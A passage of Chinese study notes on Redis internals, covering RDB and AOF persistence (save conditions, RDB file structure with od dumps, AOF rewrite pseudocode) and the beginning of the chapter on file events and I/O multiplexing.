两个命令的实际工作都由子进程执行，所以这两个命令在操作方面并没有什么冲突的地方。不能同时执行它们只是一个性能方面的考虑——并发出两个子进程，并且这两个子进程都同时执行大量的磁盘写入操作，这怎么想都不会是一个好主意。\nRDB文件载入时的服务器状态服务器在载入RDB文件期间，会一直处于阻塞状态，直到载入工作完成为止。\n自动间隔性保存SAVE命令由服务器进程执行保存工作，BGSAVE命令则由子进程执行保存工作，所以SAVE命令会阻塞服务器，而BGSAVE命令则不会。\n因为BGSAVE命令可以在不阻塞服务器进程的情况下执行，所以Redis允许用户通过设置服务器配置的save选项，让服务器每隔一段时间自动执行一次BGSAVE命令。用户可以通过save选项设置多个保存条件，但只要其中任意一个条件被满足，服务器就会执行BGSAVE命令。\n设置保存条件当Redis服务器启动时，用户可以通过指定配置文件或者传入启动参数的方式设置save选项，如果用户没有主动设置save选项，那么服务器会为save选项设置默认条件：\nsave 900 1save 300 10save 60 10000\n\n\n服务器在900秒之内，对数据库进行了至少1次修改。\n服务器在300秒之内，对数据库进行了至少10次修改。\n服务器在60秒之内，对数据库进行了至少10000次修改。\n\n接着，服务器程序会根据save选项所设置的保存条件，设置服务器状态redisServer结构的saveparams属性：\nstruct redisServer &#123;    // ...    // 记录了保存条件的数组    struct saveparam *saveparams;    // ...&#125;;\n\nsaveparams属性是一个数组，数组中的每个元素都是一个saveparam结构，每个saveparam结构都保存了一个save选项设置的保存条件：\nstruct saveparam &#123;    // 秒数    time_t seconds;    // 修改数    int changes;&#125;;\n\ndirty 计数器和 lastsave 属性除了 saveparams 数组之外，服务器状态还维持着一个 dirty 计数器，以及一个 lastsave 属性：\n\ndirty 计数器记录距离上一次成功执行 SAVE 命令或者 BGSAVE 命令之后，服务器对数据库状态（服务器中的所有数据库）进行了多少次修改（包括写入、删除、更新等操作）。\nlastsave 属性是一个 UNIX 时间戳，记录了服务器上一次成功执行 SAVE 命令或者 BGSAVE 命令的时间。\n\nstruct redisServer &#123;    // ...    // 修改计数器    long long dirty;    // 上一次执行保存的时间    time_t lastsave;    // ...&#125;;\n\n当服务器成功执行一个数据库修改命令之后，程序就会对dirty计数器进行更新：命令修改了多少次数据库，dirty计数器的值就增加多少。\n检查保存条件是否满足Redis的服务器周期性操作函数serverCron默认每隔100毫秒就会执行一次，该函数用于对正在运行的服务器进行维护，它的其中一项工作就是检查save选项所设置的保存条件是否已经满足，如果满足的话，就执行BGSAVE命令。\n以下伪代码展示了serverCron函数检查保存条件的过程：\ndef serverCron():    # ...    # 遍历所有保存条件    for saveparam in server.saveparams:        # 计算距离上次执行保存操作有多少秒        save_interval = unixtime_now() - server.lastsave        # 如果数据库状态的修改次数超过条件所设置的次数        # 并且距离上次保存的时间超过条件所设置的时间        # 那么执行保存操作        if server.dirty &gt;= saveparam.changes and save_interval &gt; saveparam.seconds:            BGSAVE()    # ...\n\n程序会遍历并检查saveparams数组中的所有保存条件，只要有任意一个条件被满足，那么服务器就会执行BGSAVE命令。\nRDB文件结构RDB文件结构如下：\n\nRDB文件的最开头是REDIS部分，这个部分的长度为5字节，保存着“REDIS”五个字符。通过这五个字符，程序可以在载入文件时，快速检查所载入的文件是否RDB文件。因为RDB文件保存的是二进制数据，而不是C字符串，为了简便起见，我们用”REDIS”符号代表’R’、’E’、’D’、’I’、’S’五个字符，而不是带’\\0’结尾符号的C字符串’R’、’E’、’D’、’I’、’S’、’\\0’。后续关于RDB文件的结构都是这样。\ndb_version长度为4字节，它的值是一个字符串表示的整数，这个整数记录了RDB文件的版本号，比如”0006”就代表RDB文件的版本为第六版。这里介绍的也是第六版RDB文件的结构。（虽然我看这本书的时候，redis最新版本已经是7.4.1了。）databases部分包含着零个或任意多个数据库，以及各个数据库中的键值对数据：\n\n如果服务器的数据库状态为空（所有数据库都是空的），那么这个部分也为空，长度为0字节。\n如果服务器的数据库状态为非空（有至少一个数据库非空），那么这个部分也为非空，根据数据库所保存键值对的数量、类型和内容不同，这个部分的长度也会有所不同。\n\nEOF常量的长度为1字节，这个常量标志着RDB文件正文内容的结束，当读入程序遇到这个值的时候，它知道所有数据库的所有键值对都已经载入完毕了。check_sum是一个8字节长的无符号整数，保存着一个校验和，这个校验和是程序通过对REDIS、db_version、databases、EOF四个部分的内容进行计算得出的。服务器在载入RDB文件时，会将载入数据所计算出的校验和与check_sum所记录的校验和进行对比，以此来检查RDB文件是否有出错或者损坏的情况出现。\ndatabases部分一个RDB文件的databases部分可以保存任意多个非空数据库。\n例如，如果服务器的0号数据库和3号数据库非空，那么服务器将创建一个如图所示的RDB文件，图中的database 0代表0号数据库中的所有键值对数据，而database 3则代表3号数据库中的所有键值对数据。\n\n每个非空数据库在RDB文件中都可以保存为SELECTDB、db_number、key_value_pairs三个部分。\n\nSELECTDB常量的长度为1字节，当读入程序遇到这个值的时候，它知道接下来要读入的将是一个数据库号码。db_number保存着一个数据库号码，根据号码的大小不同，这个部分的长度可以是1字节、2字节或者5字节。当程序读入db_number部分之后，服务器会调用SELECT命令，根据读入的数据库号码进行数据库切换，使得之后读入的键值对可以载入到正确的数据库中。key_value_pairs部分保存了数据库中的所有键值对数据，如果键值对带有过期时间，那么过期时间也会和键值对保存在一起。根据键值对的数量、类型、内容以及是否有过期时间等条件的不同，key_value_pairs部分的长度也会有所不同。\nkey_value_pairs部分RDB文件中的每个key_value_pairs部分都保存了一个或以上数量的键值对，如果键值对带有过期时间的话，那么键值对的过期时间也会被保存在内。\n不带过期时间的键值对在RDB文件中由TYPE、key、value三部分组成。\nTYPE记录了value的类型，长度为1字节，值可以是以下常量的其中一个：\n\nREDIS_RDB_TYPE_STRING\nREDIS_RDB_TYPE_LIST\nREDIS_RDB_TYPE_SET\nREDIS_RDB_TYPE_ZSET\nREDIS_RDB_TYPE_HASH\nREDIS_RDB_TYPE_LIST_ZIPLIST\nREDIS_RDB_TYPE_SET_INTSET\nREDIS_RDB_TYPE_ZSET_ZIPLIST\nREDIS_RDB_TYPE_HASH_ZIPLIST\n\n以上列出的每个TYPE常量都代表了一种对象类型或者底层编码，当服务器读入RDB文件中的键值对数据时，程序会根据TYPE的值来决定如何读入和解释value的数据。key和value分别保存了键值对的键对象和值对象：\n\n其中key总是一个字符串对象，它的编码方式和REDIS_RDB_TYPE_STRING类型的value一样。根据内容长度的不同，key的长度也会有所不同。\n根据TYPE类型的不同，以及保存内容长度的不同，保存value的结构和长度也会有所不同，稍后会详细说明每种TYPE类型的value结构保存方式。\n\n带有过期时间的键值对在RDB文件中由EXPIRETIME_MS、ms、TYPE、key、value五部分组成。\n\nEXPIRETIME_MS常量的长度为1字节，它告知读入程序，接下来要读入的将是一个以毫秒为单位的过期时间。\nms是一个8字节长的带符号整数，记录着一个以毫秒为单位的UNIX时间戳，这个时间戳就是键值对的过期时间。\n\nvalue的编码RDB文件中的每个value部分都保存了一个值对象，每个值对象的类型都由与之对应的TYPE记录，根据类型的不同，value部分的结构、长度也会有所不同。\n字符串对象如果TYPE的值为REDIS_RDB_TYPE_STRING，那么value保存的就是一个字符串对象，字符串对象的编码可以是REDIS_ENCODING_INT或者REDIS_ENCODING_RAW。\n如果字符串对象的编码为REDIS_ENCODING_INT，那么说明对象中保存的是长度不超过32位的整数。其中，ENCODING的值可以是REDIS_RDB_ENC_INT8、REDIS_RDB_ENC_INT16或者REDIS_RDB_ENC_INT32三个常量的其中一个，它们分别代表RDB文件使用8位（bit）、16位或者32位来保存整数值integer。\nINT编码字符串对象的保存结构\n如果字符串对象的编码为REDIS_ENCODING_RAW，那么说明对象所保存的是一个字符串值，根据字符串长度的不同，有压缩和不压缩两种方法来保存这个字符串：\n\n如果字符串的长度小于等于20字节，那么这个字符串会直接被原样保存。\n如果字符串的长度大于20字节，那么这个字符串会被压缩之后再保存。\n\n以上两个条件是在假设服务器打开了RDB文件压缩功能的情况下进行的，如果服务器关闭了RDB文件压缩功能，那么RDB程序总以无压缩的方式保存字符串值。具体信息可以参考redis.conf文件中关于rdbcompression选项的说明。\n对于没有被压缩的字符串，RDB程序会以下图所示的结构来保存该字符串。\n其中，string部分保存了字符串值本身，而len保存了字符串值的长度。对于压缩后的字符串，RDB程序会以下图所示的结构来保存该字符串。\n其中，REDIS_RDB_ENC_LZF常量标志着字符串已经被LZF算法压缩过了，读入程序在碰到这个常量时，会根据之后的compressed_len、origin_len和compressed_string三部分，对字符串进行解压缩：其中compressed_len记录的是字符串被压缩之后的长度，而origin_len记录的是字符串原来的长度，compressed_string记录的则是被压缩之后的字符串。\n列表对象如果TYPE的值为REDIS_RDB_TYPE_LIST，那么value保存的就是一个REDIS_ENCODING_LINKEDLIST编码的列表对象，RDB文件保存这种对象的结构如下图所示。\nlist_length记录了列表的长度，它记录列表保存了多少个项（item），读入程序可以通过这个长度知道自己应该读入多少个列表项。图中以item开头的部分代表列表的项，因为每个列表项都是一个字符串对象，所以程序会以处理字符串对象的方式来保存和读入列表项。\n集合对象如果TYPE的值为REDIS_RDB_TYPE_SET，那么value保存的就是一个REDIS_ENCODING_HT编码的集合对象，RDB文件保存这种对象的结构如下图所示。\n其中，set_size是集合的大小，它记录集合保存了多少个元素，读入程序可以通过这个大小知道自己应该读入多少个集合元素。图中以elem开头的部分代表集合的元素，因为每个集合元素都是一个字符串对象，所以程序会以处理字符串对象的方式来保存和读入集合元素。\n哈希表对象如果TYPE的值为REDIS_RDB_TYPE_HASH，那么value保存的就是一个REDIS_ENCODING_HT编码的集合对象，RDB文件保存这种对象的结构下图所示：\n\nhash_size记录了哈希表的大小，也即是这个哈希表保存了多少键值对，读入程序可以通过这个大小知道自己应该读入多少个键值对。\n以key_value_pair开头的部分代表哈希表中的键值对，键值对的键和值都是字符串对象，所以程序会以处理字符串对象的方式来保存和读入键值对。\n\n\n结构中的每个键值对（key_value_pair）都以键紧挨着值的方式排列在一起。\n有序集合对象如果TYPE的值为REDIS_RDB_TYPE_ZSET，那么value保存的就是一个REDIS_ENCODING_SKIPLIST编码的有序集合对象，RDB文件保存这种对象的结构如图10-34所示。\nsorted_set_size记录了有序集合的大小，也即是这个有序集合保存了多少元素，读入程序需要根据这个值来决定应该读入多少有序集合元素。以element开头的部分代表有序集合中的元素，每个元素又分为成员（member）和分值（score）两部分，成员是一个字符串对象，分值则是一个double类型的浮点数，程序在保存RDB文件时会先将分值转换成字符串对象，然后再用保存字符串对象的方法将分值保存起来。\nINTSET编码的集合如果TYPE的值为REDIS_RDB_TYPE_SET_INTSET，那么value保存的就是一个整数集合对象，RDB文件保存这种对象的方法是，先将整数集合转换为字符串对象，然后将这个字符串对象保存到RDB文件里面。如果程序在读入RDB文件的过程中，碰到由整数集合对象转换成的字符串对象，那么程序会根据TYPE值的指示，先读入字符串对象，再将这个字符串对象转换成原来的整数集合对象。\nZIPLIST编码的列表、哈希表或者有序集合如果TYPE的值为REDIS_RDB_TYPE_LIST_ZIPLIST、REDIS_RDB_TYPE_HASH_ZIPLIST或者REDIS_RDB_TYPE_ZSET_ZIPLIST，那么value保存的就是一个压缩列表对象，RDB文件保存这种对象的方法是：\n\n将压缩列表转换成一个字符串对象。\n将转换所得的字符串对象保存到RDB文件。\n\n如果程序在读入RDB文件的过程中，碰到由压缩列表对象转换成的字符串对象，那么程序会根据TYPE值的指示，执行以下操作：\n\n读入字符串对象，并将它转换成原来的压缩列表对象。\n根据TYPE的值，设置压缩列表对象的类型：如果TYPE的值为REDIS_RDB_TYPE_LIST_ZIPLIST，那么压缩列表对象的类型为列表；如果TYPE的值为REDIS_RDB_TYPE_HASH_ZIPLIST，那么压缩列表对象的类型为哈希表；如果TYPE的值为REDIS_RDB_TYPE_ZSET_ZIPLIST，那么压缩列表对象的类型为有序集合。\n\n从步骤2可以看出，由于TYPE的存在，即使列表、哈希表和有序集合三种类型都使用压缩列表来保存，RDB读入程序也总可以将读入并转换之后得出的压缩列表设置成原来的类型。\n分析RDB文件使用od命令来分析Redis服务器产生的RDB文件，该命令可以用给定的格式转存（dump）并打印输入文件。比如说，给定-c参数可以以ASCII编码的方式打印输入文件，给定-x参数可以以十六进制的方式打印输入文件，诸如此类，具体的信息可以参考od命令的文档。\n不包含任何键值对的RDB文件使用 FLUSHALL 清空数据库，使用 SAVE 创建一个数据库状态为空的RDB文件。使用od命令，打印RDB文件：\nroot@b9283e6096c1:/data# od -c dump.rdb0000000   R   E   D   I   S   0   0   1   2 372  \\t   r   e   d   i   s0000020   -   v   e   r 005   7   .   4   .   1 372  \\n   r   e   d   i0000040   s   -   b   i   t   s 300   @ 372 005   c   t   i   m   e 3020000060   g   d   1   g 372  \\b   u   s   e   d   -   m   e   m 302   X0000100 316 021  \\0 372  \\b   a   o   f   -   b   a   s   e 300  \\0 3770000120 272 257 332 306 334 330 026   w0000130\n\n第 7 版中新增加的操作符，以 0xFA （372 8进制） 作为标志。可以存放多组 key-value，用来表示对应元信息。每一对 key-value，都以0xFA 开头。key 和 value 均采用 rdb 字符串编码方法。 默认元信息列表：\n\nredis-ver：redis 版本信息。\nredis-bits：输出 rdb 文件机器的位数，64bit 或 32 bit。\nctime：rdb 文件创建时间。\nused-mem：rdb 加载到内存中的内存使用量。\n\n包含字符串键的RDB文件root@b9283e6096c1:/data# od -c dump.rdb0000000   R   E   D   I   S   0   0   1   2 372  \\t   r   e   d   i   s0000020   -   v   e   r 005   7   .   4   .   1 372  \\n   r   e   d   i0000040   s   -   b   i   t   s 300   @ 372 005   c   t   i   m   e 3020000060   /   r   1   g 372  \\b   u   s   e   d   -   m   e   m 302   H0000100 220 022  \\0 372  \\b   a   o   f   -   b   a   s   e 300  \\0 3760000120  \\0 373 001  \\0  \\0 003   m   s   g 005   h   e   l   l   o 3770000140   g 270   o   c 003 235   ~   f0000150\n\n这里由于每个版本的格式并不一致，所以就不详细解读了。（书中版本较老，新版本加了很多东西）可以参考这篇文章：Redis RDB 文件格式解析\n第十一章 - AOF持久化除了RDB持久化功能之外，Redis还提供了AOF（Append Only File）持久化功能。与RDB持久化通过保存数据库中的键值对来记录数据库状态不同，AOF持久化是通过保存Redis服务器所执行的写命令来记录数据库状态的。\nRDB持久化保存数据库状态的方法是将msg、fruits、numbers三个键的键值对保存到RDB文件中。而AOF持久化保存数据库状态的方法则是将服务器执行的SET、SADD、RPUSH三个命令保存到AOF文件中。\n被写入AOF文件的所有命令都是以Redis的命令请求协议格式（纯文本格式）保存的。\nAOF持久化的实现AOF持久化功能的实现可以分为命令追加（append）、文件写入、文件同步（sync）三个步骤。\n命令追加当AOF持久化功能处于打开状态时，服务器在执行完一个写命令之后，会以协议格式将被执行的写命令追加到服务器状态的aof_buf缓冲区的末尾。\nAOF文件的写入与同步Redis的服务器进程就是一个事件循环（loop），这个循环中的文件事件负责接收客户端的命令请求，以及向客户端发送命令回复，而时间事件则负责执行像serverCron函数这样需要定时运行的函数。\n因为服务器在处理文件事件时可能会执行写命令，使得一些内容被追加到aof_buf缓冲区里面，所以在服务器每次结束一个事件循环之前，它都会调用flushAppendOnlyFile函数，考虑是否需要将aof_buf缓冲区中的内容写入和保存到AOF文件里面，这个过程可以用以下伪代码表示：\ndef eventLoop():    while True:        # 处理文件事件，接收命令请求以及发送命令回复        # 处理命令请求时可能会有新内容被追加到 aof_buf 缓冲区中        processFileEvents()        # 处理时间事件        processTimeEvents()        # 考虑是否要将 aof_buf 中的内容写入和保存到 AOF 文件里面        flushAppendOnlyFile()\n\nflushAppendOnlyFile 函数的行为由服务器配置的 appendfsync 选项的值来决定，各个不同值产生的行为。\n\n\n\nappendonly 选项的值\nflushAppendonlyFile 函数的行为\n\n\n\nalways\n将 aof_buf 缓冲区中的所有内容写入并同步到 AOF 文件，确保数据实时持久化。\n\n\neverysec\n将 aof_buf 缓冲区中的所有内容写入 AOF 文件，每隔一秒钟检查上次同步时间，如果超过一秒则再次同步。同步由一个独立线程负责执行，以减少阻塞。\n\n\nno\n将 aof_buf 缓冲区中的所有内容写入 AOF 文件，但不立即同步，何时同步由操作系统决定，可能在后台缓冲区写满或其他条件下触发。\n\n\n如果用户没有主动为appendfsync选项设置值，那么appendfsync选项的默认值为everysec，关于appendfsync选项的更多信息，请参考Redis项目附带的示例配置文件redis.conf。\n文件的写入和同步为了提高文件的写入效率，在现代操作系统中，当用户调用write函数，将一些数据写入到文件的时候，操作系统通常会将写入数据暂时保存在一个内存缓冲区里面，等到缓冲区的空间被填满、或者超过了指定的时限之后，才真正地将缓冲区中的数据写入到磁盘里面。这种做法虽然提高了效率，但也为写入数据带来了安全问题，因为如果计算机发生停机，那么保存在内存缓冲区里面的写入数据将会丢失。为此，系统提供了fsync和fdatasync两个同步函数，它们可以强制让操作系统立即将缓冲区中的数据写入到硬盘里面，从而确保写入数据的安全性。\nAOF持久化的效率和安全性服务器配置appendfsync选项的值直接决定AOF持久化功能的效率和安全性。\n\n当appendfsync的值为always时，服务器在每个事件循环都要将aof_buf缓冲区中的所有内容写入到AOF文件，并且同步AOF文件，所以always的效率是appendfsync选项三个值当中最慢的一个，但从安全性来说，always也是最安全的，因为即使出现故障停机，AOF持久化也只会丢失一个事件循环中所产生的命令数据。\n当appendfsync的值为everysec时，服务器在每个事件循环都要将aof_buf缓冲区中的所有内容写入到AOF文件，并且每隔一秒就要在子线程中对AOF文件进行一次同步。从效率上来讲，everysec模式足够快，并且就算出现故障停机，数据库也只丢失一秒钟的命令数据。\n当appendfsync的值为no时，服务器在每个事件循环都要将aof_buf缓冲区中的所有内容写入到AOF文件，至于何时对AOF文件进行同步，则由操作系统控制。因为处于no模式下的flushAppendOnlyFile调用无须执行同步操作，所以该模式下的AOF文件写入速度总是最快的，不过因为这种模式会在系统缓存中积累一段时间的写入数据，所以该模式的单次同步时长通常是三种模式中时间最长的。从平摊操作的角度来看，no模式和everysec模式的效率类似，当出现故障停机时，使用no模式的服务器将丢失上次同步AOF文件之后的所有写命令数据。\n\nAOF文件的载入与数据还原因为AOF文件里面包含了重建数据库状态所需的所有写命令，所以服务器只要读入并重新执行一遍AOF文件里面保存的写命令，就可以还原服务器关闭之前的数据库状态。\nRedis读取AOF文件并还原数据库状态的详细步骤如下：\n\n创建一个不带网络连接的伪客户端（fake client）：因为Redis的命令只能在客户端上下文中执行，而载入AOF文件时所使用的命令直接来源于AOF文件而不是网络连接，所以服务器使用了一个没有网络连接的伪客户端来执行AOF文件保存的写命令，伪客户端执行命令的效果和带网络连接的客户端执行命令的效果完全一样。\n从AOF文件中分析并读取出一条写命令。\n使用伪客户端执行被读出的写命令。\n一直执行步骤2和步骤3，直到AOF文件中的所有写命令都被处理完毕为止。\n\nAOF重写因为AOF持久化是通过保存被执行的写命令来记录数据库状态的，所以随着服务器运行时间的流逝，AOF文件中的内容会越来越多，文件的体积也会越来越大。如果不加以控制的话，体积过大的AOF文件很可能对Redis服务器、甚至整个宿主计算机造成影响，并且AOF文件的体积越大，使用AOF文件来进行数据还原所需的时间就越多。\n为了解决AOF文件体积膨胀的问题，Redis提供了AOF文件重写（rewrite）功能。通过该功能，Redis服务器可以创建一个新的AOF文件来替代现有的AOF文件，新旧两个AOF文件所保存的数据库状态相同，但新AOF文件不会包含任何浪费空间的冗余命令，所以新AOF文件的体积通常会比旧AOF文件的体积要小得多。\nAOF文件重写的实现虽然Redis将生成新AOF文件替换旧AOF文件的功能命名为“AOF文件重写”，但实际上，AOF文件重写并不需要对现有的AOF文件进行任何读取、分析或者写入操作，这个功能是通过读取服务器当前的数据库状态来实现的。AOF重写功能的实现原理是 从数据库中读取键现在的值，然后用一条命令去记录键值对，代替之前记录这个键值对的多条命令。从而减少新AOF文件的体积。\ndef aof_rewrite(new_aof_file_name):    # 创建新 AOF 文件    f = create_file(new_aof_file_name)    # 遍历数据库    for db in redisServer.db:        # 忽略空数据库        if db.is_empty(): continue        # 写入SELECT命令，指定数据库号码        f.write_command(&quot;SELECT&quot; + db.id)        # 遍历数据库中的所有键        for key in db:            # 忽略已过期的键            if key.is_expired(): continue            # 根据键的类型对键进行重写            if key.type == String:                rewrite_string(key)            elif key.type == List:                rewrite_list(key)            elif key.type == Hash:                rewrite_hash(key)            elif key.type == Set:                rewrite_set(key)            elif key.type == SortedSet:                rewrite_sorted_set(key)            # 如果键带有过期时间，那么过期时间也要被重写            if key.have_expire_time():                rewrite_expire_time(key)    # 写入完毕，关闭文件    f.close()def rewrite_string(key):    # 使用GET命令获取字符串键的值    value = GET(key)    # 使用SET命令重写字符串键    f.write_command(SET, key, value)def rewrite_list(key):    # 使用LRANGE命令获取列表键包含的所有元素    item1, item2, ..., itemN = LRANGE(key, 0, -1)    # 使用RPUSH命令重写列表键    f.write_command(RPUSH, key, item1, item2, ..., itemN)def rewrite_hash(key):    # 使用HGETALL命令获取哈希键包含的所有键值对    field1, value1, field2, value2, ..., fieldN, valueN = HGETALL(key)    # 使用HMSET命令重写哈希键    f.write_command(HMSET, key, field1, value1, field2, value2, ..., fieldN, valueN)def rewrite_set(key);# 使用SMEMBERS命令获取集合键包含的所有元素elem1, elem2, ..., elemN = SMEMBERS(key)# 使用SADD命令重写集合键f.write_command(SADD, key, elem1, elem2, ..., elemN)def rewrite_sorted_set(key):    # 使用ZRANGE命令获取有序集合键包含的所有元素    member1, score1, member2, score2, ..., memberN, scoreN = ZRANGE(key, 0, -1, &quot;WITHSCORES&quot;)    # 使用ZADD命令重写有序集合键    f.write_command(ZADD, key, score1, member1, score2, member2, ..., scoreN, memberN)def rewrite_expire_time(key):    # 获取毫秒精度的键过期时间戳    timestamp = get_expire_time_in_unixstamp(key)    # 使用PEXPIREAT命令重写键的过期时间    f.write_command(PEXPIREAT, key, timestamp)\n\n因为aof_rewrite函数生成的新AOF文件只包含还原当前数据库状态所必须的命令，所以新AOF文件不会浪费任何硬盘空间。\n在实际中，为了避免在执行命令时造成客户端输入缓冲区溢出，重写程序在处理列表、哈希表、集合、有序集合这四种可能会带有多个元素的键时，会先检查键所包含的元素数量，如果元素的数量超过了redis.h&#x2F;REDIS_AOF_REWRITE_ITEMS_PER_CMD常量的值，那么重写程序将使用多条命令来记录键的值，而不单单使用一条命令。\nAOF后台重写上面介绍的AOF重写程序aof_rewrite函数可以很好地完成创建一个新AOF文件的任务，但是，因为这个函数会进行大量的写入操作，所以调用这个函数的线程将被长时间阻塞。因为Redis服务器使用单个线程来处理命令请求，所以如果由服务器直接调用aof_rewrite函数的话，那么在重写AOF文件期间，服务期将无法处理客户端发来的命令请求。\n很明显，作为一种辅佐性的维护手段，Redis不希望AOF重写造成服务器无法处理请求，所以Redis决定将AOF重写程序放到子进程里执行，这样做可以同时达到两个目的：\n\n子进程进行AOF重写期间，服务器进程（父进程）可以继续处理命令请求。\n子进程带有服务器进程的数据副本，使用子进程而不是线程，可以在避免使用锁的情况下，保证数据的安全性。\n\n不过，使用子进程也有一个问题需要解决，因为子进程在进行AOF重写期间，服务器进程还需要继续处理命令请求，而新的命令可能会对现有的数据库状态进行修改，从而使得服务器当前的数据库状态和重写后的AOF文件所保存的数据库状态不一致。为了解决这种数据不一致问题，Redis服务器设置了一个AOF重写缓冲区，这个缓冲区在服务器创建子进程之后开始使用，当Redis服务器执行完一个写命令之后，它会同时将这个写命令发送给AOF缓冲区和AOF重写缓冲区。\n这也就是说，在子进程执行AOF重写期间，服务器进程需要执行以下三个工作：\n\n执行客户端发来的命令。\n将执行后的写命令追加到AOF缓冲区。\n将执行后的写命令追加到AOF重写缓冲区。\n\n这样一来可以保证：\n\nAOF缓冲区的内容会定期被写入和同步到AOF文件，对现有AOF文件的处理工作会如常进行。\n从创建子进程开始，服务器执行的所有写命令都会被记录到AOF重写缓冲区里面。\n\n当子进程完成AOF重写工作之后，它会向父进程发送一个信号，父进程在接到该信号之后，会调用一个信号处理函数，并执行以下工作：\n\n将AOF重写缓冲区中的所有内容写入到新AOF文件中，这时新AOF文件所保存的数据库状态将和服务器当前的数据库状态一致。\n对新的AOF文件进行改名，原子地（atomic）覆盖现有的AOF文件，完成新旧两个AOF文件的替换。\n\n这个信号处理函数执行完毕之后，父进程就可以继续像往常一样接受命令请求了。在整个AOF后台重写过程中，只有信号处理函数执行时会对服务器进程（父进程）造成阻塞，在其他时候，AOF后台重写都不会阻塞父进程，这将AOF重写对服务器性能造成的影响降到了最低。\n第十二章 - 事件Redis服务器是一个事件驱动程序，服务器需要处理以下两类事件：\n\n文件事件（file event）：Redis服务器通过套接字与客户端（或者其他Redis服务器）进行连接，而文件事件就是服务器对套接字操作的抽象。服务器与客户端（或者其他服务器）的通信会产生相应的文件事件，而服务器则通过监听并处理这些事件来完成一系列网络通信操作。\n时间事件（time event）：Redis服务器中的一些操作（比如serverCron函数）需要在给定的时间点执行，而时间事件就是服务器对这类定时操作的抽象。\n\n文件事件Redis基于Reactor模式开发了自己的网络事件处理器：这个处理器被称为文件事件处理器（file event handler）：\n\n文件事件处理器使用I&#x2F;O多路复用（multiplexing）程序来同时监听多个套接字，并根据套接字目前执行的任务来为套接字关联不同的事件处理器。\n当被监听的套接字准备好执行连接应答（accept）、读取（read）、写入（write）、关闭（close）等操作时，与操作相对应的文件事件就会产生，这时文件事件处理器就会调用套接字之前关联好的事件处理器来处理这些事件。\n\n虽然文件事件处理器以单线程方式运行，但通过使用I&#x2F;O多路复用程序来监听多个套接字，文件事件处理器既实现了高性能的网络通信模型，又可以很好地与Redis服务器中其他同样以单线程方式运行的模块进行对接，这保持了Redis内部单线程设计的简单性。\n文件事件处理器的构成文件事件是对套接字操作的抽象，每当一个套接字准备好执行连接应答（accept）、写入、读取、关闭等操作时，就会产生一个文件事件。因为一个服务器通常会连接多个套接字，所以多个文件事件有可能会并发地出现。I&#x2F;O多路复用程序负责监听多个套接字，并向文件事件分派器传送那些产生了事件的套接字。尽管多个文件事件可能会并发地出现，但I&#x2F;O多路复用程序总是会将所有产生事件的套接字都放到一个队列里面，然后通过这个队列，以有序（sequentially）、同步（synchronously）、每次一个套接字的方式向文件事件分派器传送套接字。当上一个套接字产生的事件被处理完毕之后（该套接字为事件所关联的事件处理器执行完毕），I&#x2F;O多路复用程序才会继续向文件事件分派器传送下一个套接字。\n文件事件分派器接收I&#x2F;O多路复用程序传来的套接字，并根据套接字产生的事件的类型，调用相应的事件处理器。服务器会为执行不同任务的套接字关联不同的事件处理器，这些处理器是一个个函数，它们定义了某个事件发生时，服务器应该执行的动作。\nI&#x2F;O多路复用程序的实现Redis的I&#x2F;O多路复用程序的所有功能都是通过包装常见的select、epoll、evport和kqueue这些I&#x2F;O多路复用函数库来实现的。每个I&#x2F;O多路复用函数库在Redis源码中都对应一个单独的文件，比如ae_select.c、ae_epoll.c、ae_kqueue.c，诸如此类。\n因为Redis为每个I&#x2F;O多路复用函数库都实现了相同的API，所以I&#x2F;O多路复用程序的底层实现是可以互换的\nRedis在I&#x2F;O多路复用程序的实现源码中用#include宏定义了相应的规则，程序会在编译时自动选择系统中性能最高的I&#x2F;O多路复用函数库来作为Redis的I&#x2F;O多路复用程序的底层实现：\n/* Include the best multiplexing layer supported by this system.  * The following should be ordered by performances, descending. */# ifdef HAVE_EVPORT# include &quot;ae_evport.c&quot;# else    # ifdef HAVE_EPOLL    # include &quot;ae_epoll.c&quot;    # else        # ifdef HAVE_KQUEUE        # include &quot;ae_kqueue.c&quot;        # else        # include &quot;ae_select.c&quot;        # endif    # endif# endif\n\n事件的类型I&#x2F;O多路复用程序可以监听多个套接字的ae.h&#x2F;AE_READABLE事件和ae.h&#x2F;AE_WRITABLE事件，这两类事件和套接字操作之间的对应关系如下：\n\n当套接字变得可读时（客户端对套接字执行write操作，或者执行close操作），或者有新的可应答（acceptable）套接字出现时（客户端对服务器的监听套接字执行connect操作），套接字产生AE_READABLE事件。\n当套接字变得可写时（客户端对套接字执行read操作），套接字产生AE_WRITABLE事件。\n\nI&#x2F;O多路复用程序允许服务器同时监听套接字的AE_READABLE事件和AE_WRITABLE事件，如果一个套接字同时产生了这两种事件，那么文件事件分派器会优先处理AE_READABLE事件，等到AE_READABLE事件处理完之后，才处理AE_WRITABLE事件。这也就是说，如果一个套接字又可读又可写的话，那么服务器将先读套接字，后写套接字。\nAPIae.c&#x2F;aeCreateFileEvent函数接受一个套接字描述符、一个事件类型，以及一个事件处理器作为参数，将给定套接字的给定事件加入到I&#x2F;O多路复用程序的监听范围之内，并对事件和事件处理器进行关联。ae.c&#x2F;aeDeleteFileEvent函数接受一个套接字描述符和一个监听事件类型作为参数，让I&#x2F;O多路复用程序取消对给定套接字的给定事件的监听，并取消事件和事件处理器之间的关联。ae.c&#x2F;aeGetFileEvents函数接受一个套接字描述符，返回该套接字正在被监听的事件类型：\n\n如果套接字没有任何事件被监听，那么函数返回AE_NONE。\n如果套接字的读事件正在被监听，那么函数返回AE_READABLE。\n如果套接字的写事件正在被监听，那么函数返回AE_WRITABLE。\n如果套接字的读事件和写事件正在被监听，那么函数返回AE_READABLE|AE_WRITABLE。\n\nae.c&#x2F;aeWait函数接受一个套接字描述符、一个事件类型和一个毫秒数为参数，在给定的时间内阻塞并等待套接字的给定类型事件产生，当事件成功产生，或者等待超时之后，函数返回。ae.c&#x2F;aeApiPoll函数接受一个sys&#x2F;time.h&#x2F;struct 